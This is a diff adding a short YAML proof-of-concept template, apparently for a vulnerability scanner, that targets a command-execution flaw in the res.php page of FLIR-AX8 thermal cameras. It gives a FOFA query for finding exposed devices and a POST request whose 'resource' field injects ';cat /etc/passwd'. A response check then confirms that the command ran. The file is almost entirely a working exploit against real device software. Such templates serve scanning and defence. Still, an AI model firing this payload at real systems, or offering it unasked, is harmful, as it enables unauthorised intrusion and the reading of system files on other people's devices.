@@ -1,0 +1,25 @@
+id: poc-yaml-flir-ax8-res-php-rce
+info:
+  name: FLIR-AX8 res.php 后台命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: FLIR-AX8
+  fofa: app="FLIR-FLIR-AX8"
+requests:
+- method: POST
+  path: /res.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action=node&resource=;cat+/etc/passwd
+  expression: 'status_code == 200
+
+    && contains(body,"root:")
+
+    && contains(body,"/bin")
+
+    && !contains(body,"<")
+
+    '
+variables: {}
+transport: http
